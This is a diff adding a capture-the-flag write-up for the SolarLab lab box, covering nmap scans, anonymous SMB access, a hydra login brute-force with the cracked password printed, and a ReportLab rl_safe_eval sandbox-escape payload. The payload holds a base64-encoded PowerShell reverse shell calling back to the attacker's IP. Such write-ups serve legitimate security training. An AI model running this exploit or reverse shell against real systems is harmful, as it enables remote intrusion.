@@ -1177,3 +1177,301 @@ Impacket & RS
 ### Root flag
 
 * TBD
+
+## SolarLab
+
+### Reco
+
+#### nmap
+
+<figure><img src=".gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
+
+#### website
+
+* informs us, that SolarLab is encypted conversations app like Signal...
+* Contact form
+* Theme: Kite from Jewel Theme
+
+#### nmap2
+
+`sudo nmap -sC -sV -O -A -oA 10.10.11.16_solarlab 10.10.11.16 -v`
+
+```bash
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 00:41 EAT
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 00:41
+Completed NSE at 00:41, 0.00s elapsed
+Initiating NSE at 00:41
+Completed NSE at 00:41, 0.00s elapsed
+Initiating NSE at 00:41
+Completed NSE at 00:41, 0.00s elapsed
+Initiating Ping Scan at 00:41
+Scanning 10.129.60.6 [4 ports]
+Completed Ping Scan at 00:41, 0.39s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 00:41
+Completed Parallel DNS resolution of 1 host. at 00:41, 0.07s elapsed
+Initiating SYN Stealth Scan at 00:41
+Scanning 10.129.60.6 [1000 ports]
+Discovered open port 445/tcp on 10.129.60.6
+Discovered open port 80/tcp on 10.129.60.6
+Discovered open port 139/tcp on 10.129.60.6
+Discovered open port 135/tcp on 10.129.60.6
+Discovered open port 6791/tcp on 10.129.60.6
+Discovered open port 7680/tcp on 10.129.60.6
+Completed SYN Stealth Scan at 00:42, 19.76s elapsed (1000 total ports)
+Initiating Service scan at 00:42
+Scanning 4 services on 10.129.60.6
+Completed Service scan at 00:42, 33.11s elapsed (4 services on 1 host)
+Initiating OS detection (try #1) against 10.129.60.6
+Retrying OS detection (try #2) against 10.129.60.6
+Initiating Traceroute at 00:42
+Completed Traceroute at 00:42, 0.47s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 00:42
+Completed Parallel DNS resolution of 2 hosts. at 00:42, 0.09s elapsed
+NSE: Script scanning 10.129.60.6.
+Initiating NSE at 00:42
+Completed NSE at 00:43, 40.16s elapsed
+Initiating NSE at 00:43
+Completed NSE at 00:43, 1.60s elapsed
+Initiating NSE at 00:43
+Completed NSE at 00:43, 0.01s elapsed
+Nmap scan report for 10.129.60.6
+Host is up (0.38s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          nginx 1.24.0
+|_http-server-header: nginx/1.24.0
+|_http-title: Did not follow redirect to http://solarlab.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+6791/tcp open  hnm
+7680/tcp open  pando-pub
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=255 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|  date: 2024-05-11T19:xx:xx
+|_  start_date: N/A
+| smb2-security-mode:
+|  3:1:1:
+|_    Message signing enabled but not required
+
+
+Host script results:
+|_clock-skew: -1s
+| smb2-security-mode:
+|  3:1:1:
+|_    Message signing enabled but not required
+| smb2-time:
+|  date: 2024-05-11T19:xx:xx
+|_  start_date: N/A
+
+Recon on SMB:
+
+        Sharename      Type      Comment
+        ---------      ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        Documents      Disk     
+        IPC$            IPC      Remote IPC
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT       ADDRESS
+1   452.14 ms 10.10.14.1
+2   452.12 ms 10.129.60.6
+
+NSE: Script Post-scanning.
+Initiating NSE at 00:43
+Completed NSE at 00:43, 0.00s elapsed
+Initiating NSE at 00:43
+Completed NSE at 00:43, 0.00s elapsed
+Initiating NSE at 00:43
+Completed NSE at 00:43, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 107.76 seconds
+           Raw packets sent: 2096 (96.146KB) | Rcvd: 45 (2.802KB)
+```
+
+#### nmap3
+
+`sudo nmap -T4 -A -p- 10.10.11.16`
+
+```bash
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-17 09:15 CEST
+Nmap scan report for solarlab.htb (10.10.11.16)
+Host is up (0.035s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          nginx 1.24.0
+|_http-server-header: nginx/1.24.0
+|_http-title: SolarLab Instant Messenger
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+6791/tcp open  http          nginx 1.24.0
+|_http-server-header: nginx/1.24.0
+|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
+Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+| smb2-time: 
+|   date: 2024-05-17T07:17:28
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT      ADDRESS
+1   39.05 ms 10.10.14.1
+2   39.25 ms solarlab.htb (10.10.11.16)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 157.25 seconds
+```
+
+* According to the nmap scans:
+  * 80 HTTP w redirect
+    * add to hosts
+      * sudo nano /etc/hosts
+        * 10.10.11.16 solarlab.htb
+  * 135 MSRPC
+  * 139 NETBIOS SSN
+  * 445 MICROSOFT DS
+  * 6791 HTTP
+    * report.solarlab.htb:6791
+  * SMB2
+
+#### website2
+
+* report.solarlab.htb:6791
+
+<figure><img src=".gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>
+
+### Weaponisation
+
+#### smb
+
+`smbclient -N -L 10.10.11.16`
+
+<figure><img src=".gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>
+
+`smbclient -N //10.10.11.16/Documents`
+
+* `get details-file.xlsx`
+
+<figure><img src=".gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>
+
+details-file.xlsx
+
+* PW file
+  * tested these logins on report.solarlab.htb, but didnt work
+
+<figure><img src=".gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>
+
+#### hydra
+
+lets test login with obtained credentials...
+
+* create usernames and passwords file
+
+<figure><img src=".gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>
+
+* `hydra -L usernames -P passwords -s 6791 report.solarlab.htb http-post-form "/login:username=^USER^&password=^PASS^:Login"`
+
+<figure><img src=".gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>
+
+* we obtained login for report subpage...
+
+### Exploitation
+
+#### Login to reports as BlakeB
+
+* BlakeB:ThisCanB3typedeasily1@
+
+<figure><img src=".gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>
+
+* under all of these for links, there is a form where we can **UPLOAD FILE**
+
+<figure><img src=".gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>
+
+* I tried to create revshell as php and saved it as png, but didnt work...
+
+### User flag
+
+#### BurpSuite
+
+* Fill the form, generate PDF at analyse it in BurpSuite
+
+<figure><img src=".gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>
+
+* Report generated by reportlab.com
+
+<figure><img src=".gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>
+
+#### CVE
+
+* RCE on reportlab
+* [https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897](https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897)
+*   [reportlab](https://pypi.org/project/reportlab/) is a Python library for generating PDFs and graphics.
+
+    Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to insufficient checks in the ‘rl\_safe\_eval’ function. Attackers can inject malicious code into an HTML file that will later be converted to PDF using software that relies on the ReportLab library. To exploit the vulnerability, the entire malicious code must be executed with `eval` in a single expression.
+
+#### Generate payload
+
+* revshells.com
+
+<figure><img src=".gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>
+
+* we will place the payload into the field of the form (0123456789)
+
+<figure><img src=".gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>
+
+* body of payload
+
+```html
+<para>
+    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('REVSHELL_PAYLOAD') for Attacker in [orgTypeFun('Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">
+    exploit
+    </font>
+</para>
+```
+
+* insert the payload insted of "REVSHELL\_PAYOAD"
+* final form:
+
+```html
+<para>
+    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=') for Attacker in [orgTypeFun('Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">
+    exploit
+    </font>
+</para>
+```
+
+<figure><img src=".gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>
+
+* we are in
+
+<figure><img src=".gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>
+
+### Root flag
+
